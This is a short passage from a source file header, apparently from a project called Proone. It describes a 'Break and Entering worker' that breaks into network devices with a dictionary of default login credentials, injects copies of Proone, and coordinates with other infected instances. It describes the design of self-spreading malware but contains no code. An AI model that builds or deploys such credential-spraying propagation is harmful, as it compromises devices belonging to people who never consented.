/** \file The Break and Entering Worker
 *
 * The Break and Entering worker is a task unit. Its purpose is to break into a
 * device on the network using vulnerabilities(namely using default login
 * credentials) to inject a new instnace of Proone. It's also responsible for
 * M2M communications with other existing Proone instances. The instantiation
 * requires parametres of the target host, the vulnerabilities to try and the
 * data required for the vulnerabilities(namely the cred dict).
